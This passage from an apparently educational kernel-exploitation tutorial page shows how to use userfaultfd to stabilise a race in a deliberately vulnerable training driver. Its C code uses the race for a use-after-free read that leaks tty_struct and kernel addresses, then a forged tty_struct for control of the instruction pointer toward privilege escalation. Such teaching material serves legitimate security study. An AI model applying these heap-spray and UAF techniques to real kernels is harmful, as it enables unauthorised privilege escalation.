+When a page fault occurs, the <code>read</code> inside <code>fault_handler_thread</code> receives the event and returns data for the faulting page. In this sample program, the returned data depends on how many faults have happened so far.</p>
+<p>Inside <code>main</code>, we allocate two pages<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup> and register them with <code>userfaultfd</code>. The first two <code>strcpy</code> calls fault on first access and therefore invoke the <code>userfaultfd</code> handler. If the handler is called twice and the returned contents show up as expected, then it worked:</p>
+<center>
+  <img src="img/uffd_sample.png" alt="Example use of userfaultfd" style="width:480px;">
+</center>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_normal.png" alt="Wolf" ></div>
+  <p class="says">
+    The userfaultfd handler runs in a separate thread, so it may execute on a different CPU from the main thread.
+    If you allocate objects inside the handler and the heap cache differs by CPU, the UAF may fail, so use <code>sched_setaffinity</code> to pin the CPU.
+  </p>
+</div>
+<h2 id="Stabilizing-the-race">Stabilizing the race</h2>
+<p>Now let’s actually use <code>userfaultfd</code> in an exploit.<br>
+With <code>userfaultfd</code>, we can switch control from kernel space back to user space exactly when a page fault occurs. Since the fault happens on first read or write to the registered user-space page, in this driver we can suspend execution inside <code>copy_from_user</code> or <code>copy_to_user</code>. In other words, we can stop execution in the following places:</p>
+<ul>
+<li><code>copy_from_user</code> inside <code>blob_add</code></li>
+<li><code>copy_to_user</code> inside <code>blob_get</code></li>
+<li><code>copy_from_user</code> inside <code>blob_set</code></li>
+</ul>
+<p>Because our goal is a Use-after-Free, we can pause execution in one of those functions and call <code>blob_del</code> while the target operation is still in progress. If we delete during <code>blob_get</code>, we get a UAF read; if we delete during <code>blob_set</code>, we get a UAF write. Let’s try reading and writing a <code>tty_struct</code> that way.<br>
+The overall flow is:</p>
+<center>
+  <img src="img/uffd_uafr.png" alt="Use-after-Free using userfaultfd" style="width:720px;">
+</center>
+<p>We call <code>blob_get</code> on a <code>victim</code> buffer allocated from the same size class as <code>tty_struct</code> (<code>kmalloc-1024</code>). If we pass an address registered with <code>userfaultfd</code>, then <code>copy_to_user</code> inside <code>blob_get</code> page-faults and invokes the handler. Because there is no locking, the handler can call <code>blob_del</code>, freeing <code>victim</code>.<br>
+If we then spray <code>tty_struct</code>, a TTY object is allocated in the just-freed slot. When the handler returns and <code>copy_to_user</code> resumes, data is copied from the old <code>victim</code> address, which now actually contains the sprayed <code>tty_struct</code>, so the TTY object is leaked into user space.<br>
+Calling <code>blob_set</code> gives the analogous UAF write. Let’s confirm it in code.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">cpu_set_t</span> pwn_cpu;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> victim;</span><br><span class="line"><span class="type">char</span> *buf;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">copy</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">  <span class="type">long</span> uffd;</span><br><span class="line">  <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* run on the same CPU as the main thread */</span></span><br><span class="line">  <span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">cpu_set_t</span>), &amp;pwn_cpu))</span><br><span class="line">    fatal(<span class="string">&quot;sched_setaffinity&quot;</span>);</span><br><span class="line"></span><br><span class="line">  uffd = (<span class="type">long</span>)arg;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] fault_handler_thread: waiting for page fault...&quot;</span>);</span><br><span class="line">  pollfd.fd = uffd;</span><br><span class="line">  pollfd.events = POLLIN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pollfd.revents &amp; POLLERR || pollfd.revents &amp; POLLHUP)</span><br><span class="line">      fatal(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* wait for a page fault */</span></span><br><span class="line">    <span class="keyword">if</span> (read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg)) &lt;= <span class="number">0</span>) fatal(<span class="string">&quot;read(uffd)&quot;</span>);</span><br><span class="line">    assert (msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* choose the page contents to return */</span></span><br><span class="line">    <span class="keyword">switch</span> (fault_cnt++) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>: &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] UAF read&quot;</span>);</span><br><span class="line">        <span class="comment">/* [1-2] page fault from `blob_get` */</span></span><br><span class="line">        <span class="comment">// free victim</span></span><br><span class="line">        del(victim);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// spray tty_struct so it overlaps victim</span></span><br><span class="line">        <span class="type">int</span> fds[<span class="number">0x10</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">          fds[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);</span><br><span class="line">          <span class="keyword">if</span> (fds[i] == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/ptmx&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// page data buffer (will be overwritten by copy_to_user anyway)</span></span><br><span class="line">        copy.src = (<span class="type">unsigned</span> <span class="type">long</span>)buf;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment">/* [2-2] page fault from `blob_set` */</span></span><br><span class="line">        <span class="comment">// free victim</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address;</span><br><span class="line">    copy.len = <span class="number">0x1000</span>;</span><br><span class="line">    copy.mode = <span class="number">0</span>;</span><br><span class="line">    copy.copy = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;copy) == <span class="number">-1</span>) fatal(<span class="string">&quot;ioctl(UFFDIO_COPY)&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">/* make sure both main and handler run on the same CPU */</span></span><br><span class="line">  CPU_ZERO(&amp;pwn_cpu);</span><br><span class="line">  CPU_SET(<span class="number">0</span>, &amp;pwn_cpu);</span><br><span class="line">  <span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">cpu_set_t</span>), &amp;pwn_cpu))</span><br><span class="line">    fatal(<span class="string">&quot;sched_setaffinity&quot;</span>);</span><br><span class="line">    </span><br><span class="line">  fd = open(<span class="string">&quot;/dev/fleckvieh&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/fleckvieh&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *page;</span><br><span class="line">  page = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">              MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (page == MAP_FAILED) fatal(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">  register_uffd(page, <span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">  buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  victim = add(buf, <span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">set</span>(victim, <span class="string">&quot;Hello&quot;</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* [1-1] UAF Read: leak tty_struct */</span></span><br><span class="line">  get(victim, page, <span class="number">0x400</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80</span>; i += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02x: 0x%016lx\n&quot;</span>, i, *(<span class="type">unsigned</span> <span class="type">long</span>*)(page + i));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>The code is long, but it does exactly what the diagram described. It confirms that a Use-after-Free can be triggered with essentially 100% reliability.</p>
+<center>
+  <img src="img/test_uaf.png" alt="Testing Use-after-Free" style="width:480px;">
+</center>
+<p>If you inspect the leaked data in the figure above, you may notice that the beginning of <code>tty_struct</code> was not copied correctly. (The first <code>0x30</code> bytes are zero even though fields such as <code>tty_operations</code> should be there.)<br>
+That happens because <code>copy_to_user</code> was called with a large size. <code>copy_to_user</code> starts copying from the beginning of the <code>victim</code> region. The page fault occurs only when it tries to write to the destination page, so the earliest bytes are copied before the UAF state takes effect.<br>
+Fortunately, the size of each internal copy loop in <code>copy_to_user</code> depends on the overall copy size. So if we call <code>copy_to_user</code> with a small size such as <code>0x20</code>, only the first <code>0x10</code> bytes come from before the UAF, while the remaining <code>0x10</code> bytes, including the <code>tty_operations</code> pointer, come from after the UAF.</p>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_thinking.png" alt="Wolf" ></div>
+  <p class="says">
+   If you do not know exactly at which assembly instruction the page fault occurs, debugging looks painful.
+  </p>
+</div>
+<p>Once we can leak KASLR and heap addresses, we can build a UAF write in the same way.<br>
+As usual, we overwrite a fake <code>tty_struct</code> whose <code>ops</code> points to a fake function table, but note that the address used for the UAF this time may differ from the one leaked earlier. The leaked heap address corresponds to the <code>tty_struct</code> freed by <code>close</code>, so first spray a fake <code>tty_operation</code> onto that leaked heap slot. (Here we simply reuse the same 0x400 chunk for both <code>tty_operation</code> and <code>tty_struct</code>.)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] UAF write&quot;</span>);</span><br><span class="line">        <span class="comment">/* [3-2] page fault from `blob_set` */</span></span><br><span class="line">        <span class="comment">// spray fake tty_operation over the leaked kheap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">          add(buf, <span class="number">0x400</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* [2-1] UAF Read: leak tty_struct (heap) */</span></span><br><span class="line">  victim = add(buf, <span class="number">0x400</span>);</span><br><span class="line">  get(victim, page+<span class="number">0x1000</span>, <span class="number">0x400</span>);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> kheap = *(<span class="type">unsigned</span> <span class="type">long</span>*)(page + <span class="number">0x1038</span>) - <span class="number">0x38</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;kheap = 0x%016lx\n&quot;</span>, kheap);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) close(ptmx[i]);</span><br></pre></td></tr></table></figure>
+<p>Once we have prepared a fake function table at the leaked address, we trigger the UAF again just like before:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// free victim and spray tty_struct</span></span><br><span class="line">del(victim);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">  ptmx[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);</span><br><span class="line">  <span class="keyword">if</span> (ptmx[i] == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/ptmx&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// page buffer that will be written by copy_from_user</span></span><br><span class="line">copy.src = (<span class="type">unsigned</span> <span class="type">long</span>)buf;</span><br></pre></td></tr></table></figure>
+<p>This time it is a UAF write, so we need to control the bytes that get written. Those bytes come from <code>copy.src</code>, so let’s prepare a fake <code>tty_struct</code> beforehand:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* [3-1] UAF Write: overwrite tty_struct */</span></span><br><span class="line"><span class="built_in">memcpy</span>(buf, page+<span class="number">0x1000</span>, <span class="number">0x400</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *tty = (<span class="type">unsigned</span> <span class="type">long</span>*)buf;</span><br><span class="line">tty[<span class="number">0</span>] = <span class="number">0x0000000100005401</span>; <span class="comment">// magic</span></span><br><span class="line">tty[<span class="number">2</span>] = *(<span class="type">unsigned</span> <span class="type">long</span>*)(page + <span class="number">0x10</span>); <span class="comment">// dev</span></span><br><span class="line">tty[<span class="number">3</span>] = kheap; <span class="comment">// ops</span></span><br><span class="line">tty[<span class="number">12</span>] = <span class="number">0xdeadbeef</span>; <span class="comment">// ops-&gt;ioctl</span></span><br><span class="line">victim = add(buf, <span class="number">0x400</span>);</span><br><span class="line"><span class="built_in">set</span>(victim, page+<span class="number">0x2000</span>, <span class="number">0x400</span>);</span><br></pre></td></tr></table></figure>
+<p>If RIP control works, then the hard part is done. Complete the final privilege-escalation stage yourself.</p>
+<center>
+  <img src="img/fleck_privesc.png" alt="Privilege escalation on Fleckvieh" style="width:480px;">
+</center>
+<p>The sample exploit code can be downloaded <a href="exploit/fleckvieh_uffd.c">here</a>.</p>
+<hr>
+<div class="column" title="Exercise">
+  This time we used userfaultfd only to stabilize the race.
+  If data is placed across page boundaries, however, it becomes possible to stop execution when reading or writing a specific member inside a structure.
+  Think about situations where that technique would make exploitation easier.
+</div>
+<hr class="footnotes-sep">
+<section class="footnotes">
+<ol class="footnotes-list">
+<li id="fn1" class="footnote-item"><p>We do not use <code>MAP_POPULATE</code> because we want the first access to fault. <a href="#fnref1" class="footnote-backref">↩︎</a></p>
+</li>
+</ol>
+</section>
+
+</div> 
+
+<div style="margin-top: 1em">
+    <div class="h-line-primary"></div>
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="../LK03/double_fetch.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"><a href="fuse.html">次のページへ</a></div>
+        </div>
+    
+</div>
+
+<script>
+    window.onload = detectors();
+</script>
+
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+                © 2023 ptr-yudai 🐈
+                <br>
+            
+            
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+  </body>
+</html>
